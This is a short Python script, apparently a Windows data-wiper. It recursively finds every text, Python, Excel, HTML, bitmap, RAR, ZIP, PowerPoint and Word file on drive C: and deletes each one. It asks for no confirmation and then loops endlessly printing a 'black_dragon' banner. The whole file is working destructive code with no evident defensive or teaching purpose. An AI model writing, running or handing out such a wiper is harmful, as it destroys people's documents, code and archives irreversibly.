import time
import os
import subprocess
import colorama
from colorama import Fore, Back, Style
colorama.init()

os.chdir("c:")
result = subprocess.check_output("dir /S /B *.txt",shell=True).decode().splitlines()

print(Fore.MAGENTA+"----------"+Fore.YELLOW+"----------"+Fore.MAGENTA+"----------"+Fore.YELLOW+"----------")


#result_delet = result[0]

#for p in result:
    #print( Fore.GREEN+"file >"+Fore.RED+p)

#delet_one_obgect = os.remove(result_delet)

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))
#--------------------------------------------------------------------------.txt



result = subprocess.check_output("dir /S /B *.py",shell=True).decode().splitlines()

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))

#____________________________________________________.py

result = subprocess.check_output("dir /S /B *.xlsx",shell=True).decode().splitlines()

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))

#---------------------------------------------------------.exsel
result = subprocess.check_output("dir /S /B *.html",shell=True).decode().splitlines()

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$.html

result = subprocess.check_output("dir /S /B *.bmp",shell=True).decode().splitlines()

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))

#-----------------------------------------------------------------------.

result = subprocess.check_output("dir /S /B *.rar",shell=True).decode().splitlines()

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))

#-------------------------------------------------------zip

result = subprocess.check_output("dir /S /B *.zip",shell=True).decode().splitlines()

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))
#----------------------------------------------zip

result = subprocess.check_output("dir /S /B *.pptx",shell=True).decode().splitlines()

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%paver point

result = subprocess.check_output("dir /S /B *.docx",shell=True).decode().splitlines()

for d in result:
    print(Fore.GREEN+"file_delet >")
    print(os.remove(d))
#====================================================word

black = "{black_dragon > ['_'],['='] < black_dragon}"

while black > ".":
    time.sleep(3)
    print(black)
